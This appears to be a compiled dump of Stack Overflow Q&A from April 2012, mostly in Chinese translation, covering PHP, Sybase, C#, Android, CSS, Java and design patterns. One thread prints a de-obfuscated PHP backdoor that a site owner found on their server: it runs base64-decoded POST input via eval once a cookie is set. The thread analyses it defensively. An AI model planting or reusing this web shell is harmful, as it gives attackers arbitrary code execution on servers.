<a href="#!${pageContext.request.contextPath}/dic/users/home.ct" rel="home"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:40:32.490

![在此处输入图像描述](../Images/c15b01ecf293f31e249eff3e02e42248.png)它已成为 Google 为确保一致性并使 ajax url 可抓取而建立的标准。

请参阅[http://code.google.com/web/ajaxcrawling/docs/getting-started.html](http://code.google.com/web/ajaxcrawling/docs/getting-started.html)

我相信他们正在使用`history.pushState`. 您可以`history.back()`在控制台中执行此操作，它会引导您返回页面。

顺便一提， ”！” 用于消除带有空哈希的情况。“ [http://url#](http://url#) ” 将使浏览器滑到顶部。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:38:45.753

`#`指向锚点（`<a name="xx">`或`<element id="xx">`）

爆炸可能是为了[ajax 爬行](https://developers.google.com/webmasters/ajax-crawling/docs/getting-started)兼容性。该组合`#!`用于向 Googlebot 发出您的网站支持该方案的信号。

此链接方案应仅在 javascript 中使用，而不应打印到 HTML。在这种情况下，该页面实际上并没有一个名为 的锚点`!contextPath`，但应该有一个位于 的页面`/${pageContext.request.contextPath}/dic/users/home.ct`。

# php - 如何使用 php Domdocument 获取链接的标题

> ID：10069240
> 
> 赞同：1
> 
> 时间：2012-04-09T05:21:51.290
> 
> 标签：php, regex, dom, curl, domdocument

我创建了一个脚本来从链接中获取 href 值。但我也想在二维数组中获取链接的标题。

```
$xml = new DOMDocument();
@$xml->loadHTML($searched);
foreach($xml->getElementsByTagName('a') as $lnk) {
    $links[] = $lnk->getAttribute('href');
}

 <a href="sdfsdgdgs">$Title</a> 
```

标题表示a标签之间的内容请帮助我..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:28:57.987

您快到了！

```
$xml = new DOMDocument();
@$xml->loadHTML($searched);
foreach($xml->getElementsByTagName('a') as $lnk) 
{
    $links[] = array(
        'href' => $lnk->getAttribute('href'),
        'title' => $lnk->getAttribute('title')
    );
} 
```

现在每个元素`$links`看起来像这样：

```
Array (
    [href] => http://google.com
    [title] => Google
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T21:00:11.870

Try this:

```
$lnk->item(0)->nodeValue; 
```

# sql - 选择时间部分

> ID：10069241
> 
> 赞同：0
> 
> 时间：2012-04-09T05:21:56.253
> 
> 标签：sql, sybase

我需要将时间部分和日期部分分开在不同的列中。如何从 sybase 的日期时间列中分别选择日期部分和时间部分？

```
For eg:

My Column has 09-04-2012 10:46:09

 i need "09-04-2012" and  "10:46:09" 
```

在sybase中怎么可能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:37:39.387

不太了解 Sybase，但这应该可以：

```
select dateformat(column, 'DD-MM-YYYY'), dateformat(column, 'hh:mm:ss') from tab 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:56:27.807

朋友，我找到了解决方案..

谢谢莫斯塔乔，

实际上我正在使用 SqlDBBox 工具进行检查.. 所以 dateformat 方法不支持。所以我使用了以下转换方法..它的工作正常。

```
select convert(char(8),getdate(),8)

select convert(char(8),getdate(),5) 
```

这给了我所需的输出。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-11T19:01:32.700

从选项卡中选择 convert(char(10), cob , 23)

会给你yyy-mm-dd

# android - 滚动背景示例？

> ID：10069247
> 
> 赞同：0
> 
> 时间：2012-04-09T05:22:46.717
> 
> 标签：android, surfaceview

作为一个初学者，正在寻找一个关于滚动背景和处理多线程或表面视图的好例子。我遇到了 Lunar Lander 和 JetBoy（在 android 中给出的示例作为示例），但它们有点难以理解。有什么好的例子吗？哪个更容易理解或任何人以简单的方式解释了JetBoy和lunarlander？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-17T09:14:16.073

2d 滚动背景的最佳示例是 Replica-Island，它是一个开源项目。链接在这里。这将对您有所帮助。

[http://code.google.com/p/replicaisland/source/browse/](http://code.google.com/p/replicaisland/source/browse/)

# c# - 控制台应用程序 C# 中的 App.Config 文件

> ID：10069254
> 
> 赞同：110
> 
> 时间：2012-04-09T05:24:07.880
> 
> 标签：c#, console

我有一个控制台应用程序，我想在其中写入文件名。

```
Process.Start("blah.bat"); 
```

**通常，通过将文件名写入Properties**`'blah.bat'`中的**Settings**文件，我会在 Windows 应用程序中得到类似的东西。 但是，在这里我没有找到任何*设置*文件，我添加了一个**app.config**用于相同目的。

 *****我不确定在**app.config**中写什么，这将导致我实现与***Windows Forms***中类似的事情。

例如：在 Windows 窗体中。属性中设置文件中的字符串在`Process.Start(Properties.Settings.Default.BatchFile);`
哪里。`BatchFile`

* * *

## 回答 #1

> 赞同：248
> 
> 时间：2012-04-09T05:28:49.390

您可以`System.Configuration`在项目中添加对的引用，然后：

`using System.Configuration;`

然后

`string sValue = ConfigurationManager.AppSettings["BatchFile"];`

使用这样的`app.config`文件：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
   <appSettings>
       <add key="BatchFile" value="blah.bat" />
   </appSettings>
</configuration> 
```

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2019-01-01T12:04:29.640

对于 .NET Core，从 NuGet 管理器添加 System.Configuration.ConfigurationManager。 并从**App.config**
中 读取**appSetting**

 **```
<appSettings>
  <add key="appSetting1" value="1000" />
</appSettings> 
```

从 NuGet 管理器添加 System.Configuration.ConfigurationManager

[![在此处输入图像描述](../Images/ccf307db241e929895b969e3f67c936b.png)](https://i.stack.imgur.com/ulNRF.png)

```
ConfigurationManager.AppSettings.Get("appSetting1") 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2015-12-22T06:01:02.483

用这个

```
System.Configuration.ConfigurationSettings.AppSettings.Get("Keyname") 
```*******

# html - Windows Phone 浏览器后台代理

> ID：10069256
> 
> 赞同：0
> 
> 时间：2012-04-09T05:24:27.537
> 
> 标签：html, windows-phone-7, browser

好的，所以我有一个 Windows Phone 应用程序，它有一个 Web 浏览器对象，该对象显示一个播放音频的页面（带有 htmlaudioelement）。当我的应用程序关闭时，我想继续播放此音频（这意味着保持该浏览器处于活动状态）。我知道这是可能的，因为移动互联网浏览器做到了。有人对我如何实现类似的目标有任何想法吗？

谢谢，马特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:22:38.813

你不能以你描述的方式。

[后台任务不支持](http://msdn.microsoft.com/en-us/library/hh202962%28v=vs.92%29.aspx)WebBrowser 。

您唯一能做的就是手动连接到音频源并使用[后台音频代理](http://msdn.microsoft.com/en-us/library/hh394039%28v=VS.92%29.aspx)来播放音频。

顺便说一句：仅仅因为本机应用程序 (IE) 可以做到，并不意味着您的应用程序可以做到。有大量功能仅针对手机上的本机应用程序打开。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T07:00:36.343

如果您的音频在 Internet Explorer Mobile 中继续播放，请使用[WebBrowserTask](http://msdn.microsoft.com/en-us/library/microsoft.phone.tasks.webbrowsertask%28v=vs.92%29.aspx)在 IE 中启动 URL。

# css - Web 字体不能在实时服务器上的 IE 9 中呈现，但在本地查看时很好

> ID：10069262
> 
> 赞同：1
> 
> 时间：2012-04-09T05:24:50.693
> 
> 标签：css, internet-explorer, font-face

我是一名平面设计师，我一直在重新设计我的作品集。在此过程中，我遇到了 IE 9 无法在实时服务器上呈现 @font-face 和 Google 字体的问题。奇怪的是，在 IE 9 中本地查看我自己的网站时，没有问题。

这似乎普遍发生（仅在 IE 9 中，而不在 IETester 的旧版本中），并且不孤立于我自己的网站。例如，[此演示](http://dl.dropbox.com/u/39519/webfontsdemo/index.html)在所有浏览器中都可以正常工作，但 IE 9 会恢复为默认字体。

我已经上传了我的网站，因为它现在就[在这里](http://neorelic.com.au/staging/)。标题依赖于 Font Squirrel 的这个 CSS：

```
@font-face {
font-family:'LeagueGothicRegular';
src:url('../fonts/LeagueGothic/League_Gothic-webfont.eot');
src:url('../fonts/LeagueGothic/League_Gothic-webfont.eot?#iefix') format('embedded-opentype'),
    url('../fonts/LeagueGothic/League_Gothic-webfont.woff') format('woff'),
    url('../fonts/LeagueGothic/League_Gothic-webfont.ttf') format('truetype'),
    url('../fonts/LeagueGothic/League_Gothic-webfont.svg#LeagueGothicRegular') format('svg');
font-weight:normal;
font-style:normal;
} 
```

与之前的演示一样，这在除 IE 9 之外的所有浏览器中都能完美运行。这是一个已知问题吗？或者它可能是我自己的计算机上的本地化问题？我已经尝试将 IE 9 重置为默认设置，清除缓存并重新启动。我找不到与这个确切问题有关的任何其他帖子，所以我无法解释它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T18:47:47.013

我认为这与 IE 的 Internet 选项 > 安全设置有关。如果您将“Internet”区域的安全级别设置为高，它会关闭 Web 字体。由于“Intranet”在其自己的安全级别较低的区域中，因此它显示了字体。默认情况下，在 IE9 中为支持 Web 字体的“Internet”区域设置了“中高”。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T19:14:59.763

检查您的页面是否未在兼容模式下呈现。关闭它，看看字体是否通过。

有关在此处关闭兼容模式的更多信息。 [http://www.punchakitten.com/id/forcing_ie_to_not_use_compatibility_modeever](http://www.punchakitten.com/id/forcing_ie_to_not_use_compatibility_modeever)

注意：我不得不在服务器上关闭它（HTTP 标头）...一定是出于某种原因在我们的 Intranet 区域中始终使用兼容模式的策略。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T05:41:53.970

我在 IE9 中看起来不错，你确定这不是浏览器中的设置吗？

# iphone - 使用 UIBarButtonItem 显示原始图像颜色

> ID：10069267
> 
> 赞同：1
> 
> 时间：2012-04-09T05:25:21.733
> 
> 标签：iphone

我使用下面的代码在 UIBarButtonItem 上显示图像

```
UIBarButtonItem *myButtonItem;
myButtonItem= [[UIBarButtonItem alloc] initWithImage:[UIImage imageNamed:@"image.png"] style:UIBarButtonItemStylePlain target:self action:@selector(pressB:)]; 
```

但图像颜色是两种颜色（红色/蓝色），但 ButtonItem 上显示的图像是白色的。

看起来IOS会自动将其更改为白色。

欢迎任何评论

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:37:59.513

而不仅仅是 alloc initWithImage: 如果您想在您的应用程序中的所有 UIBarButtonItems 上添加相同的图像，您可以在 appdelegae.m 中使用此方法

```
- (void)customizeAppearance
{
     // Customize the UIBarButtonItem 

    // Create resizable images
    UIImage *button30 = [[UIImage imageNamed:@"button_textured_30"] 
                         resizableImageWithCapInsets:UIEdgeInsetsMake(0, 5, 0, 5)];
    UIImage *button24 = [[UIImage imageNamed:@"button_textured_24"] 
                         resizableImageWithCapInsets:UIEdgeInsetsMake(0, 5, 0, 5)];

    [[UIBarButtonItem appearance] setBackgroundImage:button30 forState:UIControlStateNormal barMetrics:UIBarMetricsDefault];
    [[UIBarButtonItem appearance] setBackgroundImage:button24 forState:UIControlStateNormal barMetrics:UIBarMetricsLandscapePhone];
} 
```

# string - matlab：相同数字的平均组大小

> ID：10069268
> 
> 赞同：2
> 
> 时间：2012-04-09T05:25:30.783
> 
> 标签：string, matlab, search, grouping

我有一个字符串

```
a = 011112220010111122221110101111222201111111100022221111101101011... 
```

我想找到一组 0、1​​ 和 2 的平均大小（在这个例子中，它们的大小大约是 3-4）。有什么简单的方法吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T14:35:26.503

创建一个函数：

```
function avg = avg_group_size(s, g)
assert(all(ischar(s)) && ischar(g) && numel(g) == 1, 'bad input');
s = s(:); % column
not_g = char(g + 1);
s_prev = [not_g; s(1 : end - 1)];
s_next = [s(2 : end); not_g];
idx_first   = find(s_prev ~= g & s == g);
idx_last    = find(s_next ~= g & s == g);
avg = mean(idx_last - idx_first + 1);
return 
```

并称之为：

```
avg_0 = avg_group_size(a, '0'); 
```

...

但这不是很有效的方法。如果速度很重要，您需要在一个循环中计算所有平均值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:34:24.323

我不知道matlab，但我可以写一个伪代码，你可以使用它。

```
int zeros <- 0 
int ones <- 0 
...
for(i = 0 ; i < a.lenght(or size) ; i++)
   if(a[i] == 0)
     zeros++
   else if(a[i] == 1)
     ones++
...
(or you can use switch case statement) 
```

# c# - Twitter 小部件的 W3C 验证

> ID：10069272
> 
> 赞同：1
> 
> 时间：2012-04-09T05:26:02.487
> 
> 标签：c#, asp.net, twitter, w3c-validation

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:28:50.183

因为数据属性是[HTML 5 规范](http://dev.w3.org/html5/spec/Overview.html#embedding-custom-non-visible-data-with-the-data-attributes)的一部分。用于`<!DOCTYPE html>`指定 HTML 5 文档类型

*取自[这里](https://stackoverflow.com/questions/5827697/jquery-data-attribute-doesnt-w3c-validate)*

**或者**

将您的链接代码放入 document.write 以便您拥有

```
strTwittsViewer.Append(@"<script language=""javascript"" type=""text/javascript"">");
strTwittsViewer.Append(@"//<![CDATA[");
strTwittsViewer.Append(@"document.write('<span class=""cssClassFollowButton""><a href=\""https://twitter.com/Shree\"" class=\""twitter-follow-button\"" data-show-count=\""false\"">Follow @Shree</a>"");");
strTwittsViewer.Append(@"//]]>");
strTwittsViewer.Append(@"</script>"); 
```

# php - PHP hack files found - help decoding and identifying

> ID：10069273
> 
> 赞同：0
> 
> 时间：2012-04-09T05:26:02.730
> 
> 标签：php

I found a handful of hack files on our web server. I managed to de-obfuscate them a bit -- they all seem to have a part that decodes into a chunk that looks like:

```
if (!empty($_COOKIE['v']) and $_COOKIE['v']=='d'){if (!empty($_POST['c'])) {echo '<textarea rows=28 cols=80>'; $d=base64_decode(str_replace(' ','+',$_POST['c']));if($d) @eval($d); echo '</textarea>';}echo '<form action="" method=post><textarea cols=80 rows=28 name=c></textarea><br><input type=submit></form>';exit;} 
```

But this chunk (decoded above) is usually embedded into a larger code snippet. I've shared the code of one of the files in its entirety here: [http://pastie.org/3753704](http://pastie.org/3753704)

I can sort of see where this code is going, but definitely not an expert at PHP and could use some help figuring out more specifically what it's doing or enabling. Also, if anyone happens to be familiar with this hack, any information on how it works, and where the backdoor and other components of the hack may be hidden would be super helpful and greatly appreciated.

I tried to Google parts of the code, to see if others have reported it, but only came up with this link: [http://www.daniweb.com/web-development/php/threads/365059/hacked-joomla](http://www.daniweb.com/web-development/php/threads/365059/hacked-joomla)

Thanks!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:29:40.187

如果 cookie "v" 设置为 "d"，则在表单中显示文本区域。提交表单后，执行 textarea 中的代码。

```
<?php
if (!empty($_COOKIE['v']) and $_COOKIE['v']=='d'){
    if (!empty($_POST['c'])) {
        echo '<textarea rows=28 cols=80>';
        $d=base64_decode(str_replace(' ','+',$_POST['c']));
        if($d)
            @eval($d);
        echo '</textarea>';
    }
    echo '<form action="" method=post><textarea cols=80 rows=28 name=c></textarea><br><input type=submit></form>';
    exit;
}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:51:01.503

不是这个特定的技巧，但[这篇文章](https://stackoverflow.com/questions/9784682/virus-malware-modifying-htaccess-on-joomla-cms-website/9788895#9788895)中的一些建议可能会有所帮助。具体来说，访问日志可能会向您显示问题的根源。

# android - How to add g729 codec in Android application?

> ID：10069274
> 
> 赞同：0
> 
> 时间：2012-04-09T05:26:15.993
> 
> 标签：android, sip, codec

i am developing a SIP application for making and receiving a call and i want to add the G729 codec in my application.

currently i am doing analysis on open source project [SipDroid](http://code.google.com/p/sipdroid/). if i want to make that application to support G729 codec how to do that?

there is a different codecs configuration file in [org.sipdroid.codecs](http://code.google.com/p/sipdroid/source/browse/#svn%2Ftrunk%2Fsrc%2Forg%2Fsipdroid%2Fcodecs) package.how do create the this kind of .java file for G729 codec?

Any suggestion and response will be appreciated.

Log message of asterisk

```
Found RTP audio format 101
Found audio description format telephone-event for ID 101
Found RTP video format 103
Found video description format h263-1998 for ID 103
Capabilities: us - 0x100 (g729), peer - audio=0x0 (nothing)/video=0x100000 (h263p)/text=0x0 (nothing), combined - 0x0 (nothing)
Non-codec capabilities (dtmf): us - 0x1 (telephone-event|), peer - 0x1 (telephone-event|), combined - 0x1 (telephone-event|)
[Apr  9 18:00:25] NOTICE[3813]: chan_sip.c:9187 process_sdp: **No compatible codecs**, not accepting this offer! 
```

**SDP**

```
To: <sip:5003@192.168.1.17>
From: <sip:5004@192.168.1.17>;tag=z9hG4bK80811693
Call-ID: 082004294635@10.0.2.15
CSeq: 2 INVITE
Contact: <sip:5004@10.0.2.15:36252;transport=udp>
Expires: 3600
User-Agent: MySipdroid. !/2.4 beta/sdk
Authorization: Digest username="5004", realm="asterisk", nonce="6264308a", uri="sip:5003@192.168.1.17", algorithm=MD5, response="fb6dfb528d362657ef01458f96653adb"
Content-Length: 137
Content-Type: application/sdp

v=0
o=5004@192.168.1.17 0 0 IN IP4 10.0.2.15
s=Session SIP/SDP
c=IN IP4 10.0.2.15
t=0 0
m=audio 21000 RTP/AVP
a=fmtp:18 annexb=no
<------------->
--- (13 headers 7 lines) ---
Sending to 192.168.1.17:35370 (NAT)
Using INVITE request as basis request - 082004294635@10.0.2.15
Found peer '5004' for '5004' from 192.168.1.17:35370
  == Using SIP RTP CoS mark 5
Capabilities: us - 0x100 (g729), peer - audio=0x0 (nothing)/video=0x0 (nothing)/text=0x0 (nothing), combined - 0x0 (nothing)
Non-codec capabilities (dtmf): us - 0x1 (telephone-event|), peer - 0x0 (nothing), combined - 0x0 (nothing)
[Apr 10 12:01:05] NOTICE[3524]: chan_sip.c:9187 process_sdp: No compatible codecs, not accepting this offer! 
```

**Result of Show Translation**

```
core show translation
         Translation times between formats (in microseconds) for one second of data
          Source Format (Rows) Destination Format (Columns)

           g723   gsm  ulaw  alaw g726aal2 adpcm  slin lpc10  g729 speex  ilbc  g726  g722 siren7 siren14 slin16  g719 speex16 testlaw
     g723     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
      gsm     -     -  1001  1001     3000  2000  1000  3000  3999     -  8999  3999  1001      -       -   1002     -       -    1001
     ulaw     -  2000     -     1     2001  1001     1  2001  3000     -  8000  3000     2      -       -      3     -       -       2
     alaw     -  2000     1     -     2001  1001     1  2001  3000     -  8000  3000     2      -       -      3     -       -       2
 g726aal2     -  2999  1001  1001        -  2000  1000  3000  3999     -  8999  3999  1001      -       -   1002     -       -    1001
    adpcm     -  2000     2     2     2001     -     1  2001  3000     -  8000  3000     2      -       -      3     -       -       2
     slin     -  1999     1     1     2000  1000     -  2000  2999     -  7999  2999     1      -       -      2     -       -       1
    lpc10     -  2999  1001  1001     3000  2000  1000     -  3999     -  8999  3999  1001      -       -   1002     -       -    1001
     g729     -  2999  1001  1001     3000  2000  1000  3000     -     -  8999  3999  1001      -       -   1002     -       -    1001
    speex     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
     ilbc     -  2998  1000  1000     2999  1999   999  2999  3998     -     -  3998  1000      -       -   1001     -       -    1000
     g726     -  2999  1001  1001     3000  2000  1000  3000  3999     -  8999     -  1001      -       -   1002     -       -    1001
     g722     -  2000     2     2     2001  1001     1  2001  3000     -  8000  3000     -      -       -      1     -       -       2
   siren7     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
  siren14     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
   slin16     -  3000  1002  1002     3001  2001  1001  3001  4000     -  9000  4000  1000      -       -      -     -       -    1002
     g719     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
  speex16     -     -     -     -        -     -     -     -     -     -     -     -     -      -       -      -     -       -       -
  testlaw     -  2000     2     2     2001  1001     1  2001  3000     -  8000  3000     2      -       -      3     -       -       - 
```

**sip.conf**

```
[5004]
type=friend
username=5004
secret=5004
host=dynamic
context=testcontext
nat=yes
disallow=all
allow=g729
qualify=yes
callerid="919999121312"<5004> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-23T18:33:15.420

您的星号日志看起来很适合支持编解码器，但您的客户端 android 应用程序需要 g729 编码器（目前似乎是商业许可证），如果您有任何运气获得编解码器的开源许可证，请告诉我.

许可

G.729 包括来自多家公司的专利，并由 Sipro Lab Telecom 授权。Sipro Lab Telecom 是 G.729 技术和专利池的授权知识产权许可管理员。[3][4][5][6] 在许多国家，使用 G.729 可能需要支付许可费和/或特许权使用费。 [5]

来源：[http ://en.wikipedia.org/wiki/G.729](http://en.wikipedia.org/wiki/G.729)

问候。

# xcode - 试图让 Code::Blocks 在 Mac 上运行，运行 Lion。无法正确设置编译器

> ID：10069278
> 
> 赞同：1
> 
> 时间：2012-04-09T05:26:57.160
> 
> 标签：xcode, g++, osx-lion, codeblocks

首先，对不起，如果这是一个愚蠢的问题。我安装了 code::blocks 来尝试了解该程序并开始自学 C++。我有一台装有 OS 10.7.3 的 MacBook Pro。我有代码::blocks 10.05。当我尝试构建一个“Hello world”时，什么也没有发生。基于一些谷歌搜索，我发现这是因为 code::blocks 不知道在哪里可以找到调试器/编译器。进一步的谷歌搜索给了我[这个页面](http://wiki.codeblocks.org/index.php?title=Installing_a_supported_compiler#Mac_OS_X)它告诉我安装 Xcode 并修复 code::blocks 设置中的一些东西。但是，这个 wiki 显然自从 Apple 进入 App Store 后就没有更新过，因为它为编译器提供的文件路径不存在（即使安装了 Xcode，也没有 /Developer/*）。当我安装 code::blocks 和 code::blocks “自动检测”几个编译器时，已经安装了 Xcode 4.3.2。他们没有工作。如果有人知道 Xcode 将其编译器隐藏在苹果公司已经转移到应用商店的位置，我将非常感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:32:56.847

除了 Xcode 应用程序，您还需要安装“命令行工具”，它允许您从命令行调用编译器。

转到此页面：[https ://developer.apple.com/xcode/index.php](https://developer.apple.com/xcode/index.php)

并在“寻找其他开发人员工具”下查看。它要求您使用您的 Apple 开发者 ID 登录（如果您尚未支付 99 美元的计划会员费，则可以免费获得）。进入后，接下来要安装的软件包是“Xcode 命令行工具 - 2012 年 3 月下旬”（或任何列出的最新软件包）。

# java - Java Socket Closes After Connection?

> ID：10069281
> 
> 赞同：0
> 
> 时间：2012-04-09T05:27:13.960
> 
> 标签：java

Why does this port/socket close once a connection has been made by a client?

```
package app;

import java.io.*;
import java.net.*;

public class socketServer {

public static void main(String[] args) {
    int port = 3333;
    boolean socketBindedToPort = false;

    try {
        ServerSocket ServerSocketPort = new ServerSocket(port);
        System.out.println("SocketServer Set Up on Port: " + port);
        socketBindedToPort = true;

        if(socketBindedToPort == true) {
            Socket clientSocket = null;

            try {
                clientSocket = ServerSocketPort.accept();//This method blocks until a socket connection has been made to this port.
                System.out.println("Waiting for client connection on port:" + port);
                /** THE CLIENT HAS MADE A CONNECTION **/
                System.out.println("CLIENT IS CONENCTED");
            } 
            catch (IOException e) {
                System.out.println("Accept failed: " + port);
                System.exit(-1);
            }
        }
        else {
            System.out.println("Socket did not bind to the port:" + port);
        }
    }
    catch(IOException e) {
        System.out.println("Could not listen on port: " + port);
        System.exit(-1);
    }

}

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T05:29:59.717

未经测试，但我很确定这是因为您的程序中没有任何其他内容。一旦 ServerSocketPort.accept(); 完成后，程序到达 main 的末尾并关闭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:59:14.213

该程序运行得非常好。一旦客户端连接或**ServerSocket**超时，它将*立即*停止。你在这里的目标是什么？

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:32:39.097

您需要向其添加一个响应客户端的 Stream。

尝试这个：

```
Socket accepted = serverSocketPort.accept();
InputStream inStr = accepted.getInputStream(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T06:10:43.820

@马修。

恕我直言，乔尔对你的问题有最接近的答案。

“连接已关闭，因为程序在接受连接后存在”

通常，accept 在循环中运行，以便服务器不断监听端口上的连接请求**

# javascript - onmousemove event not working in Chrome

> ID：10069283
> 
> 赞同：-3
> 
> 时间：2012-04-09T05:27:24.007
> 
> 标签：javascript

I have coding for onmousemove event working well in Firefox and IE but not in Chrome:

```
 var mouse;
         function storeMouse(e) {
             if (!e) e = window.event;
             mouse = { clientX: e.clientX, clientX: e.clientY };
         }

         function test(e) {
             alert(mouse.clientX);
             if (mouse.clientX < 150) {
                 var agree = confirm("Are you sure to leave this page");
                 if (!agree) {
                     return false;
                 }
                 else {

                 }
             }
         } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:34:00.673

第 4 行的问题：重复的 mouse.clientX

# sql-server - 创建数据库问题，Visual Studio 2010

> ID：10069292
> 
> 赞同：0
> 
> 时间：2012-04-09T05:28:45.137
> 
> 标签：sql-server, database, visual-studio-2010

我加入了一个 Windows 域并安装了 SQL Express，我选择使用 Windows 身份验证和 SQL 身份验证作为登录方法，我忘记了 sa，我回到 WORKGROUP 而不是我加入的域，尝试登录或添加一个sysadmin 用户是不可能的，所以我必须创建一个名为 SQLExpress2008 的新 SQLExpress 实例，现在我打开了 Visual Studio 2010，我正在尝试创建一个数据库，但它没有告诉我它无法连接到该实例，是有没有办法恢复该 SQLExpress 实例或将默认 Visual Studio 实例设置为 SQLExpress2008 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T12:01:58.480

我自己发现了这个：

工具 > 选项 > 数据库工具 > 数据连接 >

SQL Server 实例名称（默认为空白）

# iphone - 应用程序崩溃并出现错误 AppName[5811] 因锁定系统文件而暂停：AddressBook.sqlitedb”

> ID：10069295
> 
> 赞同：2
> 
> 时间：2012-04-09T05:28:50.703
> 
> 标签：iphone, sqlite, background, addressbook, tel

我在我的应用程序中使用地址簿。我正在后台线程中获取通讯录数据。如果我从后台打开我的应用程序，我的应用程序会崩溃并出现以下错误：

```
 Application Specific Information:
[2786] was suspended with locked system files: 
/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb 
```

在我的应用程序从后台启动后，当我的应用程序收到 UIApplicationDidBecomeActiveNotification 时，我正在后台线程中获取通讯录数据。这是我的代码

```
 // In my ViewController.m

- (void)viewDidLoad
{
    [[NSNotificationCenter defaultCenter] addObserver:self
                                          selector:@selector(appLaunchedFromBackground:)
                                          name:UIApplicationDidBecomeActiveNotification object:nil];
    // Some more code
}

-(void)appLaunchedFromBackground:(NSNotification *) notification  {

    NSLog(@"In appLaunchedFromBackground");
    [self performSelectorInBackground:@selector(getUpdatedAddressBookData) withObject:nil];
}

-(void)getUpdatedAddressBookData {

    NSLog(@"In %s",__PRETTY_FUNCTION__);

    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    AddressBook *addBook = [[AddressBook alloc]init];
    [addBook fetchAddressBookDataInBackground];
    [addBook release];
    [pool drain];
} 
```

我的应用程序中也有 CALL 功能。如果我打电话给我的应用程序并在通话结束后我再次启动我的应用程序两次我的应用程序崩溃。对于 CALL，我使用了以下代码：

```
 +(void)makeCallToSelectedContact:(NSString*)phoneNo{

    NSMutableString *phoneNumber = [NSMutableString stringWithString:phoneNo];

    [phoneNumber replaceOccurrencesOfString:@" " 
                                 withString:@"" 
                                    options:NSLiteralSearch 
                                      range:NSMakeRange(0, [phoneNumber length])];
    [phoneNumber replaceOccurrencesOfString:@"(" 
                                 withString:@"" 
                                    options:NSLiteralSearch 
                                      range:NSMakeRange(0, [phoneNumber length])];
    [phoneNumber replaceOccurrencesOfString:@")" 
                                 withString:@"" 
                                    options:NSLiteralSearch 
                                      range:NSMakeRange(0, [phoneNumber length])];

    NSLog(@"phoneNumber => %@",phoneNumber);
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:[NSString stringWithFormat:@"tel:%@",phoneNumber]]]) {
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"tel:%@",phoneNumber]]];
    }
    else {
        NSLog(@"Unable to open");
        [self showAlertWithTitle:@"Alert" andMessage:@"This Device Doesn't Support Call Functionality"]; 
    }
} 
```

如何解决崩溃问题？任何形式的帮助都将受到高度赞赏。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-31T08:26:19.377

到目前为止，我发现这似乎是 iOS 6 的一项新保护措施。

当您在发送到后台后继续访问地址簿时，跳板似乎会杀死您的应用程序。当您继续在后台运行以上传一些文件时，可能会发生这种情况。

也可能是这个问题在 6.1 中消失了。日文和中文键盘也有类似的问题，它们访问具有自动完成功能的全球数据库。这个问题在 6.1 中得到了明确的解决，你的问题也很好解决了。

# design-patterns - 观察者？设计模式

> ID：10069299
> 
> 赞同：4
> 
> 时间：2012-04-09T05:29:13.007
> 
> 标签：design-patterns, observer-pattern

我有

```
public class mammal implements Imammle
{

    public String getName() {
        return "Mammal";
    }

    public String speak() {
        return getName() +  "Maaaauuu";
    }

} 
```

我需要知道我的动物何时发出声音，以便我可以实时采取相应的行动，例如吃饲料。
我应该使用什么样的设计模式？谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T04:46:59.507

[观察者](http://en.wikipedia.org/wiki/Observer_pattern)设计模式可以用来解决你的问题。在观察者模式中，有两种不同类型的对象：

1.  **Observer**对象是希望在 Observable 对象发生变化时得到通知的对象。
2.  **可观察**对象是观察者可以观察到的对象

**观察者**注册了他们希望观察的**Observable对象。**每当**Observable**对象发生变化时，它都会通知所有已注册的**Observers 。**

根据您的代码示例，我将假设您使用的是 Java。在这种情况下，您可以使用[Observer](https://docs.oracle.com/javase/8/docs/api/java/util/Observer.html)和[Observable](https://docs.oracle.com/javase/8/docs/api/java/util/Observable.html)来减少您必须对现有代码进行的更改次数。

```
public class mammal extends java.util.Observable implements Imammle
{

    public String getName() {
        return "Mammal";
